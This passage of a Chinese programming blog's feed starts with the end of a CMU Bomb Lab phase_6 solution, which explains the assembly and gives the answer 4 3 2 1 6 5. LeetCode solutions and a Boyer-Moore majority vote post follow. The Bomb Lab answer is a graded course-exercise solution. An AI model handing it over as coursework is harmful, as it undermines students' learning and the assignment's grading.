students，仔细观察下这个题，我们发现，phase_6基本上还是在本函数内跳来跳去，一上来先要读取6个数字，要求满足一定的条件，跟之前所做过的2类似。</p><p>这个代码非常长，我们可以把它划分为几个部分，每个部分完成不同的功能，即不同的限制条件，第一部分是+23-+60，要求每个数小于等于6，第二部分+60-+95，是两个循环，用来判断数字两两之间不相等，第三部分是+108-128，将读来的6个数与7求差，再存入原来的地方，第四部分130-181，这个部分有一些复杂，相当于是在栈上存了些地址，可以发现+130 的代码为mov    0x8(%rdx),%rdx，这其实就是链表的形式，每次读取next地址，这段代码的意思是，用第三部分与7求出来的差值重新安排链表节点，1对应第一个节点，2对应第二个节点，依次类推；第五部分+183-257，用来判断重新构造出的链表里的数字满足严格递减。</p><p>我们利用gdb命令: x/24w 0x6032d0（每个节点占用了4个w）发现序号1-6的节点对应的数字为：332，168，924，691，477，413，为了使其严格递减，序号应该是：3，4，5，6，1，2，考虑到我们之前用7对传入的数字作差，为了得到这个序列，传入的数字应该是，4，3，2，1，6，5这就是我们最终的结果。</p><p>总结下，这个函数是传入一个互不相等的，由6个数组成的数组，然后每个数与7作差，根据作差的结果，每个数对应原来链表的第一个节点，重新排序一个链表，要求这个链表的数值降序排列</p><p>这一题核心在于分步处理，以及观察出那个链表的存在，这十分具有挑战性，我个人在这部分上卡了很久。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CMU之所以是计算机排名第一的院校，果真有其道理，大牛愿意花时间精心设计作业，寓教于乐，从这个bomblab上可见一斑，每个bomb难度层层递增，cover了教材和课堂上所讲的重要内容，这个作业完成后，我对于汇编语言的了解与认知来到了一个新的层次，解决每个bomb都能给我带来一种成功解谜的成就感，希望中国以后也能出现这种愿意在教学和作业设计上花精力的大牛吧。</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP lab </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> Assembly Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode907 Sum Of Subarray Minimums</title>
      <link href="/2019/11/17/Leetcode907-Sum-Of-Subarray-Minimums/"/>
      <url>/2019/11/17/Leetcode907-Sum-Of-Subarray-Minimums/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given an array of integers A, find the sum of min(B), where B ranges over every (contiguous) subarray of A.</p><p>Since the answer may be large, return the answer modulo <strong>10^9 + 7</strong>.</p><p><strong>Example :</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,1,2,4]</span><br><span class="line">Output: 17</span><br><span class="line">Explanation: Subarrays are [3], [1], [2], [4], [3,1], [1,2], [2,4], [3,1,2], [1,2,4], [3,1,2,4]. </span><br><span class="line">Minimums are 3, 1, 2, 4, 1, 1, 2, 1, 1, 1.  Sum is 17.</span><br></pre></td></tr></table></figure></p><p><strong>Note:</strong></p><ul><li>1 &lt;= A.length &lt;= 30000</li><li>1 &lt;= A[i] &lt;= 30000<a id="more"></a><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2>题意很好理解，求一个数组的所有子数组里最小元素的和，暴力法可以解出来，也就是遍历所有的子数组，时间复杂度为O(N^2)，不过这个题目还有个限制条件，A的长度会达到30000，根据做这类题目的经验，凡是长度过万，O（N^2）必然会超时。</li></ul><p>的确，还有O（N）的思路。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>这是我做这题的时候想出来的一个办法，也是Solution中的方法一。</p><p>取数组中某个元素i，如果区间(left, i], [i,right) 中所有元素都大于A[i]，则一共有(i - left) * (right - i)个子数组的最小值为A[i], 注意区间的开闭，即A[left] &lt;= A[i], A[right] &lt;= A[i]，有了这样一个intuition，我们则可以从左右两边遍历，对每个i，求出上一个小于等于A[i]的数字所在的位置，并保存起来。</p><p>这是一个先进后出的结构，可以用栈实现O(N)的求解left，right的算法，具体代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumSubarrayMins</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 取模</span></span><br><span class="line">    <span class="keyword">int</span> mod = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// left[i]是左边上一个小于等于A[i]的元素的index</span></span><br><span class="line">    <span class="keyword">int</span>[] left = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">    <span class="comment">// right[i]是上一个右边小于等于A[i]的元素的index</span></span><br><span class="line">    <span class="keyword">int</span>[] right = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">    Stack&lt;Integer&gt; st = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="comment">// 基数设为-1，即(-1, 0]区间</span></span><br><span class="line">    st.push(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++)&#123;</span><br><span class="line">        <span class="comment">// left数组构造，如果栈顶对应的元素小于A[i]，利用栈的性质，栈顶对应的元素为left[i]，因为再往左，min就不会为A[i]了， 下面right同理</span></span><br><span class="line">        <span class="keyword">if</span>(st.peek() == -<span class="number">1</span> || A[i] &gt; A[st.peek()])&#123;</span><br><span class="line">            left[i] = st.peek();</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(st.peek() != -<span class="number">1</span> &amp;&amp; A[st.peek()] &gt;= A[i])</span><br><span class="line">                st.pop();</span><br><span class="line">            left[i] = st.peek();</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从右往左，再来一遍</span></span><br><span class="line">    st.clear();</span><br><span class="line">    st.push(A.length);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = A.length - <span class="number">1</span>; i &gt; - <span class="number">1</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(st.peek() == A.length || A[i] &gt;= A[st.peek()])&#123;</span><br><span class="line">            right[i] = st.peek();</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(st.peek() != A.length &amp;&amp; A[st.peek()] &gt; A[i])</span><br><span class="line">                st.pop();</span><br><span class="line">            right[i] = st.peek();</span><br><span class="line">            st.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从0 到 N以每个元素为中心，向两边扩展，求子数组，所有子数组会全部覆盖</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++)&#123;</span><br><span class="line">        res = (res + (((i - left[i]) * (right[i] - i)) % mod) * A[i] % mod) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>不过还有个方法二，今晚时间有限，待来日总结</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode679 Maximum Swap</title>
      <link href="/2019/11/17/Leetcode679-Maximum-Swap/"/>
      <url>/2019/11/17/Leetcode679-Maximum-Swap/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a non-negative integer, you could swap two digits at most once to get the maximum valued number. Return the maximum valued number you could get.</p><p><strong>Example 1:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2736</span><br><span class="line">Output: 7236</span><br><span class="line">Explanation: Swap the number 2 and the number 7.</span><br></pre></td></tr></table></figure></p><p><strong>Example 2:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 9973</span><br><span class="line">Output: 9973</span><br><span class="line">Explanation: No swap.</span><br></pre></td></tr></table></figure></p><p><strong>Note:</strong></p><p>The given number is in the range [0, 108]<br><a id="more"></a></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>给定一个数字，允许其中某两位交换一次，求能生成的最大数字。</p><p>暴力法很好想到，先转换为字符串，从头开始遍历，对于第i个数，找[i + 1, n]里的最大的数字，交换下就行了，复杂度为(O^2)。</p><p>当然，我们可以用空间换时间，比如先遍历一边，用一个数组保留[i + 1, n]里的最大的数字和所在位置即可。</p><p>注意到，所有数字其实只有0-9这十种可能性，在上面想法的基础上，我们可以做进一步优化，也就是说用一个数组保留0-9最后出现的位置，然后循环的时候比较看看0-9有没有比num[i]大，且出现的位置在i之后的数，如果有交换即可，为什么要保留最后出现的位置？ 这是由于越如果交换，小的数字放得越后，整个数字就越大，本题说到底还是一个贪心算法的思路。</p><p>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumSwap</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] str = Integer.toString(num).toCharArray();</span><br><span class="line">    <span class="keyword">int</span>[] last = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">// 存储0-9最后出现的位置</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">        last[str[i] - <span class="string">'0'</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; str.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d = <span class="number">9</span>; d &gt; -<span class="number">1</span>; d--)&#123;</span><br><span class="line">            <span class="comment">//反向迭代，根据贪心的思路，如果找到，则交换后必然为最大值</span></span><br><span class="line">            <span class="keyword">if</span>(d &gt; str[i] - <span class="string">'0'</span> &amp;&amp; last[d] &gt; i)&#123;</span><br><span class="line">                <span class="keyword">char</span> tmp = str[i];</span><br><span class="line">                str[i] = str[last[d]];</span><br><span class="line">                str[last[d]] = tmp;</span><br><span class="line">                <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> String(str));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Greedy </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode489 Robot Room Cleaner</title>
      <link href="/2019/11/14/Leetcode489-Robot-Room-Cleaner/"/>
      <url>/2019/11/14/Leetcode489-Robot-Room-Cleaner/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a robot cleaner in a room modeled as a grid.</p><p>Each cell in the grid can be empty or blocked.</p><p>The robot cleaner with 4 given APIs can move forward, turn left or turn right. Each turn it made is 90 degrees.</p><p>When it tries to move into a blocked cell, its bumper sensor detects the obstacle and it stays on the current cell.</p><p>Design an algorithm to clean the entire room using only the 4 given APIs shown below.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">interface Robot &#123;</span><br><span class="line">  // returns true if next cell is open and robot moves into the cell.</span><br><span class="line">  // returns false if next cell is obstacle and robot stays on the current cell.</span><br><span class="line">  boolean move();</span><br><span class="line"></span><br><span class="line">  // Robot will stay on the same cell after calling turnLeft/turnRight.</span><br><span class="line">  // Each turn will be 90 degrees.</span><br><span class="line">  void turnLeft();</span><br><span class="line">  void turnRight();</span><br><span class="line"></span><br><span class="line">  // Clean the current cell.</span><br><span class="line">  void clean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">room = [</span><br><span class="line">  [1,1,1,1,1,0,1,1],</span><br><span class="line">  [1,1,1,1,1,0,1,1],</span><br><span class="line">  [1,0,1,1,1,1,1,1],</span><br><span class="line">  [0,0,0,1,0,0,0,0],</span><br><span class="line">  [1,1,1,1,1,1,1,1]</span><br><span class="line">],</span><br><span class="line">row = 1,</span><br><span class="line">col = 3</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">All grids in the room are marked by either 0 or 1.</span><br><span class="line">0 means the cell is blocked, while 1 means the cell is accessible.</span><br><span class="line">The robot initially starts at the position of row=1, col=3.</span><br><span class="line">From the top left corner, its position is one row below and three columns right.</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li>The input is only given to initialize the room and the robot’s position internally. You must solve this problem “blindfolded”. In other words, you must control the robot using only the mentioned 4 APIs, without knowing the room layout and the initial robot’s position.</li><li>The robot’s initial position will always be in an accessible cell.<br>The initial direction of the robot will be facing up.</li><li>All accessible cells are connected, which means the all cells marked as 1 will be accessible by the robot.</li><li>Assume all four edges of the grid are all surrounded by wall.</li></ul><a id="more"></a><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这是一道很有意思的题目，是我刷leetcode以来见到的最奇怪的题目之一，题目是说有一个机器人，提供move，turnLeft，turnRight，clean四个API，move为每次移动一格，要求清洁所有房间，可以理解为允许在一个二维平面内，上下左右地移动，要求遍历所有房间。</p><p>不过很有意思的是，这个题目没有给地图，题目中说了初始位置，但是只在测试的时候用，也就是说并不会当作参数传进来，也就是说这个robot是属于瞎摸索的状态，此外移动只能面朝前移动，所以我们必须时刻记录robot朝向的位置，要求在这种情况下设计算法，遍历每一个能遍历的点，如果不能移动，move函数会返回false。</p><p>其实抽象出来这个题目的本质还是一个DFS，我们要随时保存访问过的节点，由于初始位置不清楚，所以干脆直接初始化位置定为（0，0），然后上下左右移动，将所到达的点保存即可。</p><p><img alt src="https://leetcode.com/problems/robot-room-cleaner/Figures/489/489_backtrack.png"></p><p>不过与通常情况下我们DFS回溯到以前的节点不需要再做什么特殊操作，然而由于本题有一个转向的元素，我们必须保证退回到原来的节点的时候机器人转向一致。</p><p>注意到turnLeft，turnRight都是每次旋转90度，也就是每四次一个轮回，利用这个性质，我们可以将机器人在返回原来的位置的时候，调整原先的转向。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//visited是一个存String的hash表，将两个坐标转化为String存起来</span></span><br><span class="line">HashSet&lt;String&gt; visited;</span><br><span class="line"><span class="comment">// dx，dy用来保存上下左右四个位置，方便搜索时遍历调用</span></span><br><span class="line"><span class="keyword">int</span>[] dx = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] dy = &#123;<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cleanRoom</span><span class="params">(Robot robot)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    visited = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    doClean(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, robot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里的direction可以用作dx，dy里的index，0是向前，1是向右，2是向下，3是向左</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doClean</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> direction, Robot robot)</span></span>&#123;</span><br><span class="line">    <span class="comment">//每次默认开始时robot已经在x，y里了，但还没有做清洁</span></span><br><span class="line">    String coord = Integer.toString(x)  + <span class="string">","</span> + Integer.toString(y);</span><br><span class="line">    visited.add(coord);        </span><br><span class="line">    robot.clean();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++)&#123;</span><br><span class="line">        robot.turnRight();</span><br><span class="line">        <span class="keyword">int</span> newDirection = (direction + i) % <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> newx = x + dx[newDirection];</span><br><span class="line">        <span class="keyword">int</span> newy = y + dy[newDirection];</span><br><span class="line">        String newCoord = Integer.toString(newx) + <span class="string">","</span> + Integer.toString(newy);</span><br><span class="line">        <span class="keyword">if</span>(visited.contains(newCoord))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(robot.move())</span><br><span class="line">            doClean(newx, newy, newDirection, robot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 四次之后方向与刚进来的时候的方向是一致的</span></span><br><span class="line">    <span class="comment">// 连续左转两次，与当前方向相反后可移动到上一个点，从哪里来，回哪里去</span></span><br><span class="line">    <span class="comment">// 不过刚回去的时候朝向是反的，得再转两次，把朝向调正确</span></span><br><span class="line">    robot.turnLeft();</span><br><span class="line">    robot.turnLeft();</span><br><span class="line">    robot.move();</span><br><span class="line">    robot.turnLeft();</span><br><span class="line">    robot.turnLeft();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很有意思的一道DFS题，需要在给定情境下能够活学活用，处理一些正常写DFS不会遇到的边界情况，弄清楚这些后，写起来还是很有意思的，万变不离其宗本质还是一个Backtracing以及DFS。</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> DFS </tag>
            
            <tag> Backtracing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Boyer-Moore Majority Vote Algorithm</title>
      <link href="/2019/11/13/Boyer-Moore-Vote-Algorithm/"/>
      <url>/2019/11/13/Boyer-Moore-Vote-Algorithm/</url>
      
        <content type="html"><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>Boyer-Moore Vote Algorithm由UT Austion的Robert S. Boyer 和 J Strother Moore提出，是为了解决找出一个数组中出现次数大于n / 2 的数的，其中n为数组长度，乃至可以类推到找出k - 1个出现次数大于n / k的数。这个问题直观上来可以使用哈希表统计出现次数，不过对于算法优化的追求，使得许多存储空间是不必要的，通过使用Boyer-Moore Majority Vote Algorithm（可译为摩尔投票）空间复杂度可以降低到O(1)，这道题现在经常出现在公司面试题中。</p><h2 id="intution"><a href="#intution" class="headerlink" title="intution"></a>intution</h2><p>如果存在出现次数大于n / k的 k - 1个数，那么剩下的数字的总数必然小于(k - 1) * k / n，比如找出大于一半的数，如果这个数存在则剩下所有的数的出现次数总和必然小于一半。即将数组抽象为两个部分，出现n / 2次数的数k，和非k。</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><ul><li>Initialize an element m and a counter i with i = 0</li><li>For each element x of the input sequence:<ul><li>If i = 0, then assign m = x and i = 1</li><li>else if m = x, then assign i = i + 1</li></ul></li><li>else assign i = i − 1</li><li>Return m<br>用找大于n / 2来举例，设置一个candidate和count，如果找到一个数等于candidiate则count + 1，否则count - 1如果count变成0，则将candidate更新为当前指针所指的新数字。<br>下图来自于wikipedia，直观上说明了为什么这个算法是可行的：</li></ul><p><img alt src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Boyer-Moore_MJRTY.svg/2560px-Boyer-Moore_MJRTY.svg.png"><br><a id="more"></a></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="Leetcode-169-Majority-Element"><a href="#Leetcode-169-Majority-Element" class="headerlink" title="Leetcode 169 Majority Element"></a>Leetcode 169 Majority Element</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> candidate = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        <span class="keyword">if</span>(candidate == num)</span><br><span class="line">            ++count;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">0</span>)&#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">            candidate = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            --count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> candidate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是这个算法的典型应用，找出出现次数大于一半的数字，这个数字保证存在</p><h3 id="Leetcode-229-Majority-Element-II"><a href="#Leetcode-229-Majority-Element-II" class="headerlink" title="Leetcode 229 Majority Element II"></a>Leetcode 229 Majority Element II</h3><p>这个是拓展，找出出现次数大于n / 3的两个数字，这两个数字不一定存在，我们只需要在最后遍历下数组，看看剩下的两个candidate能否满足条件即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> candidate1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//注意candidate1 和 candidate2初始化应该不同</span></span><br><span class="line">    <span class="keyword">int</span> candidate2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num == candidate1)</span><br><span class="line">            count1++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(num == candidate2)</span><br><span class="line">            count2++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(count1 == <span class="number">0</span>)&#123;</span><br><span class="line">            count1 = <span class="number">1</span>;</span><br><span class="line">            candidate1 = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(count2 == <span class="number">0</span>)&#123;</span><br><span class="line">            count2 = <span class="number">1</span>;</span><br><span class="line">            candidate2 = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            --count2;</span><br><span class="line">            --count1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    count1 = <span class="number">0</span>;</span><br><span class="line">    count2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num == candidate1)&#123;</span><br><span class="line">            ++count1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(num == candidate2)&#123;</span><br><span class="line">            ++count2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count1 &gt; nums.length / <span class="number">3</span>)</span><br><span class="line">        res.add(candidate1);</span><br><span class="line">    <span class="keyword">if</span>(count2 &gt; nums.length / <span class="number">3</span>)</span><br><span class="line">        res.add(candidate2);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这道题的思想还有别的拓展，如之前我有写过的<a href="https://earthaa.github.io/2019/10/28/Leetcode525-Contiguous-Array/">Leetcode525</a>，也是类似的，遇见+1，没有遇见-1，核心依然在于将整个数组抽象为两个部分。</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode692 Top-K Frequent Words</title>
      <link href="/2019/11/13/Leetcode-692-Top-K-Frequent-Words/"/>
      <url>/2019/11/13/Leetcode-692-Top-K-Frequent-Words/</url>
      
